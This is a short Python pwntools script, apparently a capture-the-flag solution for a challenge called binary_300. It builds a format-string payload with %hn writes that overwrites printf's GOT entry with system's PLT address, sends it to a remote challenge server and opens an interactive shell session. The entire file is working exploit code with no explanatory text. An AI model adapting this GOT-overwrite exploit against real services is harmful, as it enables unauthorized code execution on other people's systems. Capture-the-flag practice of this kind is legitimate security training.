#!/usr/bin/python

from pwn import *

printf_got = 0x804a00c
system_plt_high = 0x0804
system_plt_low  = 0x8410
offset = 7

payload = p32(printf_got+2)
payload += p32(printf_got)
payload += "%{}c%{}$hn".format(system_plt_high - 8, offset)
payload += "%{}c%{}$hn".format(system_plt_low - system_plt_high, offset+1)

#r = process('./binary_300')
r = remote('bamboofox.cs.nctu.edu.tw', 22003)

r.sendline(payload)
r.interactive()
